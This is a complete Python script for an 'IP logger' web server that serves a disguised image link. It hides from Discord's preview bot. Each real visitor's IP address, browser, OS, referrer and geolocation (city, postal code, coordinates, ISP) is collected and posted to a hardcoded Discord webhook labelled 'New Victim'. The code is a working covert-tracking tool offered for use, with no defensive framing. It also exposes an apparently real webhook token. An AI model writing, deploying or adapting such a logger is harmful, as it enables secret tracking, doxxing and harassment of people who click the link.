from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpx
import base64
import httpagentparser
import json
from datetime import datetime
import socket
import threading

# Configuration
WEBHOOK_URL = 'https://discord.com/api/webhooks/1411799672355553405/uU2LsNrcqU_VXvSmygH5FH3TT5saPEWRR_uqg218VlNczy3YpTCTjbObgLmhcQwUIhj2'  # Replace with your webhook URL
PORT = 8080  # Port to run the server on
HOST = '0.0.0.0'  # Host to bind to (0.0.0.0 for all interfaces)

# Custom image URL - replace with your image URL
IMAGE_URL = "https://cdn.discordapp.com/attachments/1411745601233879050/1411799978539749376/raid_icon_server.jpg?ex=68b5f8b0&is=68b4a730&hm=9b714588bf3c45b8d9e3775091f018cebf3efc07f12ce339dcc6a48cd75caf7b"  # Replace with your image URL

# Download the image once at startup
try:
    response = httpx.get(IMAGE_URL, timeout=10)
    if response.status_code == 200:
        IMAGE_DATA = response.content
        print("Successfully downloaded custom image")
    else:
        # Fallback to a transparent pixel if download fails
        IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')
        print("Failed to download custom image, using fallback")
except Exception as e:
    print(f"Error downloading image: {e}")
    IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')

class IPLoggerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress server logs
        return
    
    def do_GET(self):
        try:
            # Parse query parameters
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            
            # Get client IP address
            ip = self.get_client_ip()
            
            # Get user agent
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Parse user agent
            os, browser = self.parse_user_agent(user_agent)
            
            # Get referrer
            referrer = self.headers.get('referer', 'Direct')
            
            # Get request time
            timestamp = datetime.now().isoformat()
            
            # Get additional information
            additional_info = self.get_additional_info(ip)
            
            # Check if it's a Discord preview
            is_discord_preview = 'discord' in user_agent.lower() or 'discordbot' in user_agent.lower()
            
            # Send the appropriate response
            if is_discord_preview:
                # For Discord preview, send the image without logging
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(IMAGE_DATA)
                print("Served image to Discord preview")
            else:
                # For real users, send the image and log the information
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(IMAGE_DATA)
                
                # Send data to Discord in a separate thread to avoid blocking
                thread = threading.Thread(
                    target=self.send_to_discord,
                    args=(ip, user_agent, os, browser, referrer, timestamp, additional_info)
                )
                thread.start()
                
        except Exception as e:
            print(f"Error: {e}")
            # Still try to send the image even if logging fails
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(IMAGE_DATA)

    def get_client_ip(self):
        """Extract client IP from headers, accounting for proxies"""
        # Try common proxy headers
        for header in ['x-forwarded-for', 'x-real-ip', 'client-ip', 'cf-connecting-ip']:
            if header in self.headers:
                ips = self.headers[header].split(',')
                return ips[0].strip()  # Get the first IP in the chain
        
        # Fall back to direct connection
        return self.client_address[0]

    def parse_user_agent(self, user_agent):
        """Parse user agent string"""
        try:
            parsed = httpagentparser.detect(user_agent)
            os = parsed.get('os', {}).get('name', 'Unknown')
            browser = parsed.get('browser', {}).get('name', 'Unknown')
            return os, browser
        except:
            return 'Unknown', 'Unknown'

    def get_additional_info(self, ip):
        """Get additional information about the IP"""
        try:
            # Try to get info from ipinfo.io
            response = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'loc': data.get('loc', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'postal': data.get('postal', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        except:
            pass
        
        # Fallback if ipinfo.io fails
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = 'Unknown'
            
        return {
            'city': 'Unknown',
            'region': 'Unknown',
            'country': 'Unknown',
            'loc': 'Unknown',
            'org': 'Unknown',
            'postal': 'Unknown',
            'timezone': 'Unknown',
            'hostname': hostname
        }

    def send_to_discord(self, ip, user_agent, os, browser, referrer, timestamp, additional_info):
        """Send collected information to Discord webhook"""
        # Create a map emoji for the location
        country_flag = f":flag_{additional_info['country'].lower()}:" if additional_info['country'] != 'Unknown' else ":question:"
        
        embed = {
            "username": "PL4ys Logger",
            "avatar_url": "https://i.imgur.com/6e5kYp0.png",  # Replace with your avatar
            "content": "@everyone",  # Ping everyone when someone views the image
            "embeds": [
                {
                    "title": "🚨 PL4ys Logger - New Victim",
                    "color": 0xff0000,  # Red color for alert
                    "timestamp": timestamp,
                    "thumbnail": {
                        "url": IMAGE_URL  # Show the image in the embed
                    },
                    "footer": {
                        "text": "PL4ys Logger • Your digital watchman",
                        "icon_url": "https://i.imgur.com/6e5kYp0.png"
                    },
                    "fields": [
                        {
                            "name": "🌐 IP Address",
                            "value": f"```{ip}```",
                            "inline": True
                        },
                        {
                            "name": f"{country_flag} Location",
                            "value": f"**City:** {additional_info['city']}\n**Region:** {additional_info['region']}\n**Country:** {additional_info['country']}\n**ZIP:** {additional_info['postal']}",
                            "inline": True
                        },
                        {
                            "name": "📊 Network Info",
                            "value": f"**ISP:** {additional_info['org']}\n**Coordinates:** {additional_info['loc']}\n**Timezone:** {additional_info['timezone']}",
                            "inline": True
                        },
                        {
                            "name": "💻 System Info",
                            "value": f"**OS:** {os}\n**Browser:** {browser}",
                            "inline": True
                        },
                        {
                            "name": "🔗 Referrer",
                            "value": referrer[:100] + "..." if len(referrer) > 100 else referrer,
                            "inline": True
                        },
                        {
                            "name": "📱 User Agent",
                            "value": f"```{user_agent[:400]}```" if len(user_agent) > 400 else f"```{user_agent}```",
                            "inline": False
                        }
                    ]
                }
            ]
        }
        
        try:
            response = httpx.post(WEBHOOK_URL, json=embed, timeout=10)
            if response.status_code == 204:
                print("Successfully sent data to Discord")
            else:
                print(f"Discord API returned status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send to Discord: {e}")

def run_server():
    """Start the server"""
    server = HTTPServer((HOST, PORT), IPLoggerHandler)
    print(f"PL4ys Logger server running on {HOST}:{PORT}")
    print(f"Using image from: {IMAGE_URL}")
    print("Use this URL in an image tag: http://your-domain.com:" + str(PORT) + "/pixel.jpg")
    print("Press Ctrl+C to stop the server")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        server.shutdown()

if __name__ == '__main__':
    run_server()
